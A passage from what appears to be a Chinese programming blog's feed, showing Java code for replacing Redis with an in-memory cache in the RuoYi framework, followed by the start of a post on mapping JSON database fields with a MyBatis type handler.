<span class="token function">SimpleValueWrapper</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @Override    public <span class="token operator">&lt;</span>T<span class="token operator">></span> T <span class="token function">get</span><span class="token punctuation">(</span>Object key<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span>T<span class="token operator">></span> type<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @Override    public <span class="token operator">&lt;</span>T<span class="token operator">></span> T <span class="token function">get</span><span class="token punctuation">(</span>Object key<span class="token punctuation">,</span> Callable<span class="token operator">&lt;</span>T<span class="token operator">></span> valueLoader<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 添加缓存数据     *     * @param key   键     * @param value 值     */</span>    public <span class="token keyword">void</span> <span class="token function">put</span><span class="token punctuation">(</span>Object key<span class="token punctuation">,</span> Object value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 添加缓存数据和过期时间     *     * @param key     键     * @param value   值     * @param timeout 过期时间（秒）     */</span>    public <span class="token keyword">void</span> <span class="token function">put</span><span class="token punctuation">(</span>Object key<span class="token punctuation">,</span> Object value<span class="token punctuation">,</span> <span class="token keyword">long</span> timeout<span class="token punctuation">,</span> TimeUnit timeUnit<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>Objects<span class="token punctuation">.</span><span class="token function">isNull</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        String k <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        storage<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>timeout <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">long</span> expireTime <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timeUnit<span class="token punctuation">.</span><span class="token function">toMillis</span><span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span>            expiration<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> expireTime<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 清除指定键的缓存数据     *     * @param key 键     */</span>    @Override    public <span class="token keyword">void</span> <span class="token function">evict</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String k <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        storage<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>        expiration<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 删除集合中的对象对应的缓存数据     *     * @param collection 集合     * @return 是否删除成功     */</span>    public boolean <span class="token function">deleteObject</span><span class="token punctuation">(</span>final Collection collection<span class="token punctuation">)</span><span class="token punctuation">{</span>        collection<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>o <span class="token operator">-></span> <span class="token punctuation">{</span>            storage<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> true<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 根据模式获取集合中的键     *     * @param pattern 模式     * @return 键的集合     */</span>    public Collection<span class="token operator">&lt;</span>String<span class="token operator">></span> <span class="token function">keys</span><span class="token punctuation">(</span>final String pattern<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> storage<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 清除全部缓存数据     */</span>    @Override    public <span class="token keyword">void</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        storage<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expiration<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 判断缓存是否过期     *     * @param key 键     * @return true 过期 false 未过期     */</span>    private boolean <span class="token function">isExpired</span><span class="token punctuation">(</span>String key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Long expireTime <span class="token operator">=</span> expiration<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> Objects<span class="token punctuation">.</span><span class="token function">nonNull</span><span class="token punctuation">(</span>expireTime<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> expireTime <span class="token operator">&lt;</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="4-修改ruoyi-common的core-redis下的RedisCache类"><a href="#4-修改ruoyi-common的core-redis下的RedisCache类" class="headerlink" title="4 修改ruoyi-common的core/redis下的RedisCache类"></a>4 修改ruoyi-common的core/redis下的RedisCache类</h2><pre class=" language-c"><code class="language-c">import java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Collection<span class="token punctuation">;</span>import java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Iterator<span class="token punctuation">;</span>import java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span>import java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span>import java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Set<span class="token punctuation">;</span>import java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>TimeUnit<span class="token punctuation">;</span>import org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Autowired<span class="token punctuation">;</span>import org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>cache<span class="token punctuation">.</span>Cache<span class="token punctuation">;</span>import org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>core<span class="token punctuation">.</span>BoundSetOperations<span class="token punctuation">;</span>import org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>core<span class="token punctuation">.</span>HashOperations<span class="token punctuation">;</span>import org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>core<span class="token punctuation">.</span>RedisTemplate<span class="token punctuation">;</span>import org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>core<span class="token punctuation">.</span>ValueOperations<span class="token punctuation">;</span>import org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span>Component<span class="token punctuation">;</span>import javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Resource<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * spring redis 工具类 * **/</span>@<span class="token function">SuppressWarnings</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">"unchecked"</span><span class="token punctuation">,</span> <span class="token string">"rawtypes"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>@Componentpublic class RedisCache<span class="token punctuation">{</span><span class="token comment" spellcheck="true">//    @Autowired</span><span class="token comment" spellcheck="true">//    public RedisTemplate redisTemplate;</span>    @Resource    public MyCache myCache<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 缓存基本的对象，Integer、String、实体类等     *     * @param key 缓存的键值     * @param value 缓存的值     */</span>    public <span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token keyword">void</span> <span class="token function">setCacheObject</span><span class="token punctuation">(</span>final String key<span class="token punctuation">,</span> final T value<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        myCache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        redisTemplate.opsForValue().set(key, value);</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 缓存基本的对象，Integer、String、实体类等     *     * @param key 缓存的键值     * @param value 缓存的值     * @param timeout 时间     * @param timeUnit 时间颗粒度     */</span>    public <span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token keyword">void</span> <span class="token function">setCacheObject</span><span class="token punctuation">(</span>final String key<span class="token punctuation">,</span> final T value<span class="token punctuation">,</span> final Integer timeout<span class="token punctuation">,</span> final TimeUnit timeUnit<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        myCache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>value<span class="token punctuation">,</span> timeout<span class="token punctuation">,</span> timeUnit<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        redisTemplate.opsForValue().set(key, value, timeout, timeUnit);</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 设置有效时间     *     * @param key Redis键     * @param timeout 超时时间     * @return true=设置成功；false=设置失败     */</span>    public boolean <span class="token function">expire</span><span class="token punctuation">(</span>final String key<span class="token punctuation">,</span> final <span class="token keyword">long</span> timeout<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">expire</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> timeout<span class="token punctuation">,</span> TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 设置有效时间     *     * @param key Redis键     * @param timeout 超时时间     * @param unit 时间单位     * @return true=设置成功；false=设置失败     */</span>    public boolean <span class="token function">expire</span><span class="token punctuation">(</span>final String key<span class="token punctuation">,</span> final <span class="token keyword">long</span> timeout<span class="token punctuation">,</span> final TimeUnit unit<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        myCache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> myCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token punctuation">,</span> unit<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        return redisTemplate.expire(key, timeout, unit);</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 获取有效时间     *     * @param key Redis键     * @return 有效时间     */</span><span class="token comment" spellcheck="true">//    public long getExpire(final String key)</span><span class="token comment" spellcheck="true">//    {</span><span class="token comment" spellcheck="true">//        return redisTemplate.getExpire(key);</span><span class="token comment" spellcheck="true">//    }</span>    <span class="token comment" spellcheck="true">/**     * 判断 key是否存在     *     * @param key 键     * @return true 存在 false不存在     */</span>    public Boolean <span class="token function">hasKey</span><span class="token punctuation">(</span>String key<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> myCache<span class="token punctuation">.</span><span class="token function">hasKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        return redisTemplate.hasKey(key);</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 获得缓存的基本对象。     *     * @param key 缓存键值     * @return 缓存键值对应的数据     */</span>    public <span class="token operator">&lt;</span>T<span class="token operator">></span> T <span class="token function">getCacheObject</span><span class="token punctuation">(</span>final String key<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        Cache<span class="token punctuation">.</span>ValueWrapper valueWrapper <span class="token operator">=</span> myCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>valueWrapper <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span> valueWrapper<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//        ValueOperations&lt;String, T> operation = redisTemplate.opsForValue();</span><span class="token comment" spellcheck="true">//        return operation.get(key);</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 删除单个对象     *     * @param key     */</span>    public boolean <span class="token function">deleteObject</span><span class="token punctuation">(</span>final String key<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        myCache<span class="token punctuation">.</span><span class="token function">evict</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        return redisTemplate.delete(key);</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 删除集合对象     *     * @param collection 多个对象     * @return     */</span>    public boolean <span class="token function">deleteObject</span><span class="token punctuation">(</span>final Collection collection<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> myCache<span class="token punctuation">.</span><span class="token function">deleteObject</span><span class="token punctuation">(</span>collection<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        return redisTemplate.delete(collection) > 0;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 缓存List数据     *     * @param key 缓存的键值     * @param dataList 待缓存的List数据     * @return 缓存的对象     */</span><span class="token comment" spellcheck="true">//    public &lt;T> long setCacheList(final String key, final List&lt;T> dataList)</span><span class="token comment" spellcheck="true">//    {</span><span class="token comment" spellcheck="true">//        Long count = redisTemplate.opsForList().rightPushAll(key, dataList);</span><span class="token comment" spellcheck="true">//        return count == null ? 0 : count;</span><span class="token comment" spellcheck="true">//    }</span>    <span class="token comment" spellcheck="true">/**     * 获得缓存的list对象     *     * @param key 缓存的键值     * @return 缓存键值对应的数据     */</span><span class="token comment" spellcheck="true">//    public &lt;T> List&lt;T> getCacheList(final String key)</span><span class="token comment" spellcheck="true">//    {</span><span class="token comment" spellcheck="true">//        return redisTemplate.opsForList().range(key, 0, -1);</span><span class="token comment" spellcheck="true">//    }</span>    <span class="token comment" spellcheck="true">/**     * 缓存Set     *     * @param key 缓存键值     * @param dataSet 缓存的数据     * @return 缓存数据的对象     */</span><span class="token comment" spellcheck="true">//    public &lt;T> BoundSetOperations&lt;String, T> setCacheSet(final String key, final Set&lt;T> dataSet)</span><span class="token comment" spellcheck="true">//    {</span><span class="token comment" spellcheck="true">//        BoundSetOperations&lt;String, T> setOperation = redisTemplate.boundSetOps(key);</span><span class="token comment" spellcheck="true">//        Iterator&lt;T> it = dataSet.iterator();</span><span class="token comment" spellcheck="true">//        while (it.hasNext())</span><span class="token comment" spellcheck="true">//        {</span><span class="token comment" spellcheck="true">//            setOperation.add(it.next());</span><span class="token comment" spellcheck="true">//        }</span><span class="token comment" spellcheck="true">//        return setOperation;</span><span class="token comment" spellcheck="true">//    }</span>    <span class="token comment" spellcheck="true">/**     * 获得缓存的set     *     * @param key     * @return     */</span><span class="token comment" spellcheck="true">//    public &lt;T> Set&lt;T> getCacheSet(final String key)</span><span class="token comment" spellcheck="true">//    {</span><span class="token comment" spellcheck="true">//        return redisTemplate.opsForSet().members(key);</span><span class="token comment" spellcheck="true">//    }</span>    <span class="token comment" spellcheck="true">/**     * 缓存Map     *     * @param key     * @param dataMap     */</span><span class="token comment" spellcheck="true">//    public &lt;T> void setCacheMap(final String key, final Map&lt;String, T> dataMap)</span><span class="token comment" spellcheck="true">//    {</span><span class="token comment" spellcheck="true">//        if (dataMap != null) {</span><span class="token comment" spellcheck="true">//            redisTemplate.opsForHash().putAll(key, dataMap);</span><span class="token comment" spellcheck="true">//        }</span><span class="token comment" spellcheck="true">//    }</span>    <span class="token comment" spellcheck="true">/**     * 获得缓存的Map     *     * @param key     * @return     */</span><span class="token comment" spellcheck="true">//    public &lt;T> Map&lt;String, T> getCacheMap(final String key)</span><span class="token comment" spellcheck="true">//    {</span><span class="token comment" spellcheck="true">//        return redisTemplate.opsForHash().entries(key);</span><span class="token comment" spellcheck="true">//    }</span>    <span class="token comment" spellcheck="true">/**     * 往Hash中存入数据     *     * @param key Redis键     * @param hKey Hash键     * @param value 值     */</span><span class="token comment" spellcheck="true">//    public &lt;T> void setCacheMapValue(final String key, final String hKey, final T value)</span><span class="token comment" spellcheck="true">//    {</span><span class="token comment" spellcheck="true">//        redisTemplate.opsForHash().put(key, hKey, value);</span><span class="token comment" spellcheck="true">//    }</span>    <span class="token comment" spellcheck="true">/**     * 获取Hash中的数据     *     * @param key Redis键     * @param hKey Hash键     * @return Hash中的对象     */</span><span class="token comment" spellcheck="true">//    public &lt;T> T getCacheMapValue(final String key, final String hKey)</span><span class="token comment" spellcheck="true">//    {</span><span class="token comment" spellcheck="true">//        HashOperations&lt;String, String, T> opsForHash = redisTemplate.opsForHash();</span><span class="token comment" spellcheck="true">//        return opsForHash.get(key, hKey);</span><span class="token comment" spellcheck="true">//    }</span>    <span class="token comment" spellcheck="true">/**     * 获取多个Hash中的数据     *     * @param key Redis键     * @param hKeys Hash键集合     * @return Hash对象集合     */</span><span class="token comment" spellcheck="true">//    public &lt;T> List&lt;T> getMultiCacheMapValue(final String key, final Collection&lt;Object> hKeys)</span><span class="token comment" spellcheck="true">//    {</span><span class="token comment" spellcheck="true">//        return redisTemplate.opsForHash().multiGet(key, hKeys);</span><span class="token comment" spellcheck="true">//    }</span>    <span class="token comment" spellcheck="true">/**     * 删除Hash中的某条数据     *     * @param key Redis键     * @param hKey Hash键     * @return 是否成功     */</span><span class="token comment" spellcheck="true">//    public boolean deleteCacheMapValue(final String key, final String hKey)</span><span class="token comment" spellcheck="true">//    {</span><span class="token comment" spellcheck="true">//        return redisTemplate.opsForHash().delete(key, hKey) > 0;</span><span class="token comment" spellcheck="true">//    }</span>    <span class="token comment" spellcheck="true">/**     * 获得缓存的基本对象列表     *     * @param pattern 字符串前缀     * @return 对象列表     */</span>    public Collection<span class="token operator">&lt;</span>String<span class="token operator">></span> <span class="token function">keys</span><span class="token punctuation">(</span>final String pattern<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> myCache<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>pattern<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        return redisTemplate.keys(pattern);</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="5-修改ruoyi-common下utils-DictUtils的getDictCache方法"><a href="#5-修改ruoyi-common下utils-DictUtils的getDictCache方法" class="headerlink" title="5 修改ruoyi-common下utils/DictUtils的getDictCache方法"></a>5 修改ruoyi-common下utils/DictUtils的getDictCache方法</h2><pre class=" language-c"><code class="language-c">    <span class="token comment" spellcheck="true">/**     * 获取字典缓存     *      * @param key 参数键     * @return dictDatas 字典数据列表     */</span>    public <span class="token keyword">static</span> List<span class="token operator">&lt;</span>SysDictData<span class="token operator">></span> <span class="token function">getDictCache</span><span class="token punctuation">(</span>String key<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        JSONArray arrayCache <span class="token operator">=</span> JSONArray<span class="token punctuation">.</span><span class="token function">parseArray</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>SpringUtils<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>RedisCache<span class="token punctuation">.</span>class<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCacheObject</span><span class="token punctuation">(</span><span class="token function">getCacheKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        JSONArray arrayCache = SpringUtils.getBean(RedisCache.class).getCacheObject(getCacheKey(key));</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotNull</span><span class="token punctuation">(</span>arrayCache<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> arrayCache<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span>SysDictData<span class="token punctuation">.</span>class<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h2 id="6-修改ruoyi-framework下的RateLimiterAspect类"><a href="#6-修改ruoyi-framework下的RateLimiterAspect类" class="headerlink" title="6 修改ruoyi-framework下的RateLimiterAspect类"></a>6 修改ruoyi-framework下的RateLimiterAspect类</h2><p>基于redis的限流处理就无法使用了，先注释掉<br><img src="/images/%E4%BF%AE%E6%94%B9%E9%99%90%E6%B5%81%E7%B1%BB.png"></p><h2 id="7-重启应用"><a href="#7-重启应用" class="headerlink" title="7 重启应用"></a>7 重启应用</h2>]]></content>
      
      
      <categories>
          
          <category> RuoYi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RuoYi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSON类型字段操作</title>
      <link href="/2022/03/22/json-lei-xing-zi-duan-cao-zuo/"/>
      <url>/2022/03/22/json-lei-xing-zi-duan-cao-zuo/</url>
      
        <content type="html"><![CDATA[<h1 id="JSON类型字段操作"><a href="#JSON类型字段操作" class="headerlink" title="JSON类型字段操作"></a>JSON类型字段操作</h1><p>🚀需要注意<strong>内容转换问题</strong>，考虑查出的值的格式可否转换为JSON，若无法转换就会报错</p><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">//这里的ArrayTypeHandler类就是下文的类</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span><span class="token string">"附件材料-数组json list 传参 [{},{}]"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ColumnType</span><span class="token punctuation">(</span>typeHandler <span class="token operator">=</span> ArrayTypeHandler<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>column <span class="token operator">=</span> <span class="token string">"material"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> Object material<span class="token punctuation">;</span></code></pre><p>如果有xml映射文件就需要修改映射配置，<code>jdbcType=OTHER</code>，<code>typeHandler=类型过滤器的引用</code>。示例如下：</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>BaseResultMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.yourpackage.ForestDeal<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 其他字段 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>material<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>material<span class="token punctuation">"</span></span> <span class="token attr-name">jdbcType</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>OTHER<span class="token punctuation">"</span></span> <span class="token attr-name">typeHandler</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.handler.ArrayTypeHandler<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 其他字段 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">></span></span>..... <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if</span> <span class="token attr-name">test</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>material !<span class="token punctuation">=</span> null<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     material = #{material,jdbcType=OTHER,typeHandler=com.handler.ArrayTypeHandler} <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if</span><span class="token punctuation">></span></span></code></pre><ul><li>类型过滤器</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>psc<span class="token punctuation">.</span>medical<span class="token punctuation">.</span>handler<span class="token punctuation">;</span><span class="token keyword">import</span> cn<span class="token punctuation">.</span>hutool<span class="token punctuation">.</span>core<span class="token punctuation">.</span>collection<span class="token punctuation">.</span>CollectionUtil<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psc<span class="token punctuation">.</span>csstp<span class="token punctuation">.</span>common<span class="token punctuation">.</span>core<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>StringUtils<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>type<span class="token punctuation">.</span>JdbcType<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>type<span class="token punctuation">.</span>TypeHandler<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span>CallableStatement<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span>PreparedStatement<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span>ResultSet<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span>SQLException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>LinkedHashMap<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ArrayTypeHandler</span> <span class="token keyword">implements</span> <span class="token class-name">TypeHandler</span><span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>LinkedHashMap<span class="token operator">>></span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setParameter</span><span class="token punctuation">(</span>PreparedStatement ps<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span>List<span class="token operator">&lt;</span>LinkedHashMap<span class="token operator">></span> parameter<span class="token punctuation">,</span> JdbcType jdbcType<span class="token punctuation">)</span> <span class="token keyword">throws</span> SQLException <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>CollectionUtil<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>parameter<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ps<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>        